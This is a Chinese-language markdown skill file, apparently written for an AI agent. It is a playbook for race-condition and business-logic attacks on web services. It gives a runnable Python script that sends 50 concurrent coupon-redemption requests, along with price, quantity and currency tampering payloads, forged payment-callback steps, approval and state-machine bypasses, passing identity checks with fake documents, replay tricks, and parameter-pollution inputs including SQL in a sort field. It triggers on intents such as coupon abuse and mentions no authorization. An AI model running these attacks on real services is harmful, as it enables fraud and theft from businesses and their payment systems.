---
name: race-and-business-logic
description: 竞态与业务逻辑漏洞（并发竞态/单包多线程、条件竞争、价格与数量篡改、流程绕过、幂等失效、批量接口滥用、优惠券与积分系统）。当意图涉及"并发""重复提交""改价格""绕过流程""薅羊毛"时读本 skill。
---
# 竞态与业务逻辑 Playbook

> 逻辑漏洞不需要任何 payload 技巧，只需要**把业务规则想成可被违反的假设**。

## 1. 竞态条件（Race Condition）

**成立条件**：先检查后写入（TOCTOU）、无锁读改写、余额/库存/次数类字段。

```bash
# 单包多线程（HTTP/2 单连接并发，命中率最高）
# 用 Burp Turbo Intruder 或容器内 python 脚本
python3 - <<'PY'
import asyncio, httpx
URL="http://TARGET/api/redeem"
H={"Authorization":"Bearer TOKEN","Content-Type":"application/json"}
BODY={"code":"COUPON-ONE-TIME"}
async def one(c):
    r=await c.post(URL,json=BODY,headers=H); return r.status_code, r.text[:120]
async def main():
    async with httpx.AsyncClient(http2=True, timeout=20) as c:
        rs=await asyncio.gather(*[one(c) for _ in range(50)])
    ok=[r for r in rs if r[0]==200]
    print("200 count:", len(ok)); print(ok[:3])
asyncio.run(main())
PY
```

**高价值目标**：
| 场景 | 期望的"本该只成立一次" |
|---|---|
| 优惠券/兑换码 | 只核销一次，结果核销多次 |
| 提现/转账 | 余额只扣一次，结果并发多笔成功 |
| 库存下单 | 超卖 |
| 积分/签到 | 一天一次变多次 |
| 邀请奖励 | 自己邀自己多次拿奖励 |
| 文件上传+重命名 | 临时文件被并发读取 → 配合 LFI 拿 shell |

**判定**：并发后**系统状态真的错了**（余额/库存/次数实际变了），而不是只看到几个 200。必须回查状态接口或数据库可见结果作为证据。

## 2. 价格 / 数量 / 金额篡改

```bash
# 逐个字段改，看服务端是否二次校验
{"price": 100}      → {"price": 0.01} / {"price": -1} / {"price": "0.01"}
{"qty": 1}          → {"qty": -5}（负数常导致退款/加余额）
{"amount": 100}     → {"amount": 1e-2} / {"amount": "1e2"} / {"amount": 10000}（分/元单位）
{"currency":"CNY"}  → {"currency":"IDR"}（汇率差）
# 隐藏字段
discount / couponCode / isVip / level / role / trial
# 删掉字段 / 传 null / 传数组
```

**要点**：改的是**客户端能控、但服务端本该重算**的字段。查回商品价格是否以服务端价为准。

## 3. 流程绕过

| 模式 | 打法 |
|---|---|
| 分步流程 | 直接请求最后一步接口（跳过支付/审核/实名） |
| 状态机 | 把 `status` 从 `pending` 直接改成 `approved`；或反向流转 |
| 审批链 | 自己审批自己（同一账号既有提交权又有审批权）；批准接口不校验角色 |
| 试用/订阅 | 到期后重放激活请求；改 `expire_at`；多开试用 |
| 实名/风控 | 用假资料过审；跳过验证接口直接调业务接口 |
| 订单状态 | 未支付订单直接调"发货/确认收货"；支付回调伪造（见下） |

**支付回调伪造**（常见高危）：找到 `/pay/notify`、`/callback`、`/webhook` 类接口 → 自己发一条"支付成功"通知，看是否验签。不验签 = 白嫖。

## 4. 幂等与重复提交

- 同一请求连发两次都成功 → 看是否产生两条记录（重复下单/重复提现）
- 去掉 `Idempotency-Key` / 改 `nonce` / 复用旧签名重放
- 重放旧请求（时间戳不校验、signature 可复用）
- 对"删除""确认""评价"等一次性操作重复执行

## 5. 批量接口与参数污染

```
?ids=1,2,3 / ids[]=1&ids[]=2      # 越权批量拿数据
?limit=999999 / pageSize=-1        # 全量导出
?sort=id;SELECT ...                # 排序参数进 SQL
?fields=password,secret            # 字段级越权（GraphQL/REST 都常见）
?format=pdf|xlsx                   # 触发导出接口的二次处理（配 SSRF/XXE）
```

## 6. 权限逻辑（弱逻辑而非弱鉴权）

- 角色继承：普通用户可以给自己加角色字段
- 共享链接：`/share/{token}` 猜 token 或改参数拿到他人资源
- 邀请/推荐关系可自环 → 自己邀请自己无限刷
- 前端限制 vs 后端限制（前端置灰的按钮，后端接口仍可调）

## 7. 判定与写回

- **竞态成立**：附并发脚本 + 并发后的状态证据（余额/库存/核销次数）。
- **逻辑成立**：写清"业务假设是什么、我怎么违反的、造成什么后果（白嫖/提权/数据泄露）"。
- 别把"能提交成功"当成洞：必须造成**业务上不该发生的结果**。
- 金额类漏洞务必给最小可复现步骤 + 实际差额，别用夸张描述。
